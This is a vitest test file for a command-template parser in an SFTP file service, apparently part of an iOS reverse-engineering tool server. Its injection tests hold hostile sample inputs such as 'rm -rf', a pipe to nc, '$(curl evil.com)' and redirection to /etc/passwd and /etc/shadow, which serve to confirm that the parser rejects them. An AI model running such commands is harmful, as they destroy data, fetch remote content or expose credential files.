import { describe, expect, it } from "vitest";
import { SftpFileService } from "./sftpFileService.js";
import type { ServerConfig } from "./types.js";

const baseConfig: ServerConfig = {
  host: "127.0.0.1",
  port: 22,
  username: "mobile",
  password: "x",
  allowedRoots: ["/var/mobile"],
  localArtifactRoots: [process.cwd()],
  readOnly: true,
  allowWrites: false,
  maxReadSize: 1024,
  jsBundleMaxReadSize: 1024,
  sqliteMaxReadSize: 1024,
  r2: {
    enabled: true,
    mode: "auto",
    r2Path: "r2",
    rabin2Path: "rabin2",
    timeoutMs: 1000,
    maxOutputBytes: 1024,
    maxBinarySize: 1024
  },
  hermesDecoderPreset: "auto",
  hermesDecoderOutputLimit: 1024,
  searchCacheTtlMs: 1000,
  searchDefaultMaxResults: 10,
  searchDefaultMaxDepth: 2,
  searchMaxEntries: 100,
  backupBeforeWrite: false,
  requireWriteApproval: false,
  writeApprovalTtlMs: 1000,
  connectTimeoutMs: 1000,
  readyTimeoutMs: 1000,
  sftpOpTimeoutMs: 1000,
  logPath: "ios-files-mcp.log"
};

const svc = new SftpFileService(baseConfig);

describe("parseCommandTemplate", () => {
  it("splits on whitespace and keeps placeholder tokens intact", () => {
    expect(svc.parseCommandTemplate("hbctool disasm {input} {output}")).toEqual([
      "hbctool",
      "disasm",
      "{input}",
      "{output}"
    ]);
  });

  it("preserves single-quoted runs as one token", () => {
    expect(svc.parseCommandTemplate("'/opt/with space/hbctool' --in {input}")).toEqual([
      "/opt/with space/hbctool",
      "--in",
      "{input}"
    ]);
  });

  it("preserves double-quoted runs and handles backslash escapes", () => {
    expect(svc.parseCommandTemplate(`hermesc "-dump bytecode" {input}`)).toEqual([
      "hermesc",
      "-dump bytecode",
      "{input}"
    ]);
  });

  it("rejects shell command separators", () => {
    expect(() => svc.parseCommandTemplate("hbctool ; rm -rf /tmp")).toThrow(/metacharacter ';'/);
    expect(() => svc.parseCommandTemplate("hbctool && echo pwned")).toThrow(/metacharacter '&'/);
    expect(() => svc.parseCommandTemplate("hbctool | nc")).toThrow(/metacharacter '\|'/);
  });

  it("rejects shell substitution", () => {
    expect(() => svc.parseCommandTemplate("hbctool $(curl evil.com)")).toThrow(/shell substitution/);
    expect(() => svc.parseCommandTemplate("hbctool `whoami`")).toThrow(/backtick/);
  });

  it("rejects redirection operators", () => {
    expect(() => svc.parseCommandTemplate("hbctool {input} > /etc/passwd")).toThrow(/metacharacter '>'/);
    expect(() => svc.parseCommandTemplate("hbctool < /etc/shadow")).toThrow(/metacharacter '<'/);
  });

  it("rejects unterminated quotes", () => {
    expect(() => svc.parseCommandTemplate("hbctool 'unterminated")).toThrow(/unterminated quote/);
  });

  it("rejects empty templates", () => {
    expect(() => svc.parseCommandTemplate("")).toThrow(/empty/);
    expect(() => svc.parseCommandTemplate("   ")).toThrow(/empty/);
  });
});

describe("substituteTokens", () => {
  it("substitutes {input} and {output} placeholders", () => {
    const tokens = ["hbctool", "disasm", "{input}", "{output}"];
    expect(svc.substituteTokens(tokens, { input: "/tmp/a.hbc", output: "/tmp/out" })).toEqual({
      command: "hbctool",
      args: ["disasm", "/tmp/a.hbc", "/tmp/out"]
    });
  });

  it("substitutes placeholders embedded inside a flag value", () => {
    const tokens = ["hbctool", "--input={input}"];
    expect(svc.substituteTokens(tokens, { input: "/tmp/a.hbc", output: "" })).toEqual({
      command: "hbctool",
      args: ["--input=/tmp/a.hbc"]
    });
  });

  it("does not treat substituted values as shell — special characters are passed literally", () => {
    const tokens = ["echo", "{input}"];
    const { args } = svc.substituteTokens(tokens, { input: "; rm -rf /", output: "" });
    expect(args).toEqual(["; rm -rf /"]);
  });
});
